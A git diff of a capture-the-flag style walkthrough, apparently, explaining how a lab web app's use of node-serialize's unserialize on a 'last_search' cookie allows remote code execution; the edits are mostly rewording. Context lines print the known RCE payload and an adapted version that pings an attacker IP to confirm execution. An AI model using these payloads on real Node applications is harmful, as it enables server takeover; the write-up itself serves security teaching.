@@ -59,7 +59,7 @@ According to this message, you can understand that your next step will be downlo
 
 To begin your code review, start with the ```app.js``` file. In the ```app.js``` file, you'll again notice a warning comment regarding the ```node-serialize``` package.
 
-![image](./images/2024-09-25_17h43_07.png)
+![image](./images/2024-09-27_22h13_01.png)
 
 To identify what the node-serialize package is vulnerable to, you can search online. You'll discover that it has a critical vulnerability: arbitrary remote code execution, which is explained in the following link. This vulnerability specifically affects the ```unserialize``` function, according to the explanation.
 https://security.snyk.io/vuln/npm:node-serialize:20170208
@@ -71,13 +71,13 @@ Knowing that the web application is vulnerable to remote code execution, you can
 To understand how and for what functionality of the web application the ```node-serialize``` package is used, open the JavaScript file responsible for the home page.
 Upon reviewing the code, two key points emerge:
 * When a user searches for a keyword, it is taken from the request, serialized, and stored in a cookie named ```last_search```.
-* During each GET request to the home page, the value of the ```last_search``` cookie is retrieved, **_UNSERIALIZED_**. (which is the vulnerable part), and passed to the client side for display.
+* During each GET request to the home page, the value of the ```last_search``` cookie is retrieved, **_UNSERIALIZED_** (which is the vulnerable part), and passed to the client side to be displayed.
 
 This functionality allows users to see their most recent search by storing its value in a cookie.
 
 ![image](./images/2024-09-25_17h54_27.png)
 
-In the image below, you can see an example of the usage of this functionality.
+In the image below, you can see an example usage of this functionality.
 
 ![image](./images/2024-09-25_18h12_04.png)
 
@@ -88,9 +88,9 @@ You can find an example payload from the link provided earlier.
 {"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()"}
 ```
 
-To adapt this payload for our target application, we need to remove the dictionary structure, enclosing double quotes, and any escaped characters, keeping only the core payload.
+To adjust the payload for our target application, we need to strip away the dictionary structure, remove enclosing double quotes, escape characters, leaving only the core payload.
 
-To test if the payload works, we can attempt to ping our attacking machine and verify whether the command executes. To detect the ping requests, start a ```tcpdump``` on the attacker machine to monitor ICMP traffic.
+To test if the payload works, we can attempt to ping our attacking machine and verify whether the injected system command is executed. To detect the ping requests, start a ```tcpdump``` on the attacker machine to monitor ICMP traffic.
 
 ```javascript
 _$$ND_FUNC$$_function (){require('child_process').exec('ping <attacker IP> -c 3', function(error, stdout, stderr) { console.log(stdout) });}()
